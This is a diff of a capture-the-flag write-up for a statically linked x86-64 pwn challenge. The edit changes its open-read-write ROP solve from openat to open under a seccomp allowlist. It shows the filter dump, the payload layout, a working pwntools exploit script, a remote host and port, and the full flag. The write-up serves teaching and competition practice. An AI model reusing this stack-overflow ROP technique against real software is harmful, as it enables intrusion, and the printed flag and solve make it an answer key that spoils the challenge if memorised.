@@ -1,7 +1,7 @@
 # Ruang Baca — PWN 2, seccomp ORW
 
 **Category:** pwn · **Arch:** x86-64 Linux (Ubuntu 22.04), statically linked
-**Target time:** 12–15 min · **Flag:** `COMPFEST18{n0_3x3cv3_n0_mm4p_just_0p3n_r34d_wr1t3}`
+**Target time:** 10–13 min · **Flag:** `COMPFEST18{n0_3x3cv3_n0_mm4p_just_0p3n_r34d_wr1t3}`
 
 ---
 
@@ -42,9 +42,9 @@ It hands you the path to read and the address of a `.bss` scratch buffer.
 $ seccomp-tools dump ./chall
  0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
  0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
- 0007: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0011
- 0008: 0x15 0x02 0x00 0x000000e7  if (A == exit_group) goto 0011
- 0009: 0x15 0x01 0x00 0x00000101  if (A == openat) goto 0011
+ 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
+ 0008: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0011
+ 0009: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0011
  0010: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
  0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 ```
@@ -56,7 +56,7 @@ Five syscalls, everything else `KILL_PROCESS`. That closes every reflex:
 | `execve("/bin/sh")` / `execveat` | not on the allowlist, process killed |
 | shellcode + `mmap`/`mprotect` for RWX | both killed, and NX is on anyway |
 | SROP via `rt_sigreturn` | killed — this is a sibling challenge, not this one |
-| `open` (syscall 2) instead of `openat` | killed; only `openat` (257) is allowed |
+| `openat` (syscall 257) out of habit | killed; only `open` (2) is on the list |
 
 What remains is exactly enough to read a file and print it: **open, read, write**.
 
@@ -112,7 +112,7 @@ scratch     0x4e3340    (.bss, also printed by the banner)
 ## 5. The chain
 
 ```
-openat(AT_FDCWD, "/flag.txt", O_RDONLY)   -> fd 3
+open("/flag.txt", O_RDONLY)   -> fd 3
 read(3, scratch, 0x80)
 write(1, scratch, 0x80)
 exit_group(0)
@@ -128,15 +128,16 @@ pop rax ; <nr>
 syscall
 ```
 
-`AT_FDCWD` is `-100` (`0xffffffffffffff9c`). The path is absolute so the dirfd
-is ignored, but passing `AT_FDCWD` keeps it honest.
+`open` takes the path in `rdi` and the flags in `rsi`, so every argument
+register gets a value you already have: the fixed address of `/flag.txt`, then
+zero twice. No dirfd, and no `AT_FDCWD` constant to remember.
 
 ### Payload map (360 bytes)
 
 | Offset | Size | Contents |
 |---|---|---|
 | `0x000` | `0x48` | padding (`buf[0x40]` + saved `rbp`) |
-| `0x048` | 72 | `openat(AT_FDCWD, 0x4a6008, 0)` |
+| `0x048` | 72 | `open(0x4a6008, 0, 0)` |
 | `0x090` | 72 | `read(3, scratch, 0x80)` |
 | `0x0d8` | 72 | `write(1, scratch, 0x80)` |
 | `0x120` | 72 | `exit_group(0)` |
@@ -145,15 +146,15 @@ is ignored, but passing `AT_FDCWD` keeps it honest.
 
 ### Why fd 3, and how it was checked
 
-`openat` returns the lowest free descriptor. 0/1/2 are the socket that redpwn
+`open` returns the lowest free descriptor. 0/1/2 are the socket that redpwn
 jail hands the process, nothing else is opened before the overflow, so the flag
 lands on **fd 3**. This was verified against the deployed container rather than
 assumed, with a negative control:
 
 ```
-fd3    -> b'COMPFEST18{n0_3x3cv3_n0_mm4p_just_0p3n_r34d_wr1t3}'
-fd4    -> b'\x00\x00\x00...'        (read fails, scratch stays zeroed)
-execve -> b''                       (killed by the filter, no output)
+open+fd3   -> b'COMPFEST18{n0_3x3cv3_n0_mm4p_just_0p3n_r34d_wr1t3}'
+open+fd4   -> b'\x00\x00\x00...'        (read fails, scratch stays zeroed)
+openat 257 -> b''                       (killed by the filter, no output)
 ```
 
 ## 6. Exploit
@@ -172,7 +173,7 @@ def sys(nr, rdi, rsi, rdx):
     return flat(POP_RDI, rdi, POP_RSI, rsi, POP_RDX, rdx, POP_RAX, nr, SYSCALL)
 
 payload  = b'A' * OFFSET
-payload += sys(constants.SYS_openat, 0xffffffffffffff9c, PATH, 0)
+payload += sys(constants.SYS_open,    PATH, 0, 0)
 payload += sys(constants.SYS_read,   3, SCRATCH, 0x80)
 payload += sys(constants.SYS_write,  1, SCRATCH, 0x80)
 payload += sys(constants.SYS_exit_group, 0, 0, 0)
@@ -183,7 +184,7 @@ io.sendafter(b'pesan  > ', payload)
 Run it from `writeup/`:
 
 ```
-python3 solve.py                                       # local ../public/chall
+python3 solve.py                                       # local ../src/chall
 python3 solve.py REMOTE HOST=34.1.203.129 PORT=5600    # remote
 ```
 
@@ -210,11 +211,13 @@ isolated process per TCP connection. The jail chroots to `/srv`, so
   challenge.yml         CTFd challenge metadata
   docker-compose.yml    build + serve on :5600
   README.md             author-facing
-  ruang-baca.zip        password-protected player distribution
 src/
-  chall.c  chall  Makefile  flag.txt
+  chall.c  Makefile     source and build
+  chall                 build output
+  flag.txt              the real flag, baked into the image
+  README.player.md      player README, packed into the zip
 public/
-  chall  README.md
+  dist-ruang-baca.zip   the only thing players get
 writeup/
   solve.py  README.md  checksec.txt  seccomp-dump.txt
 ```
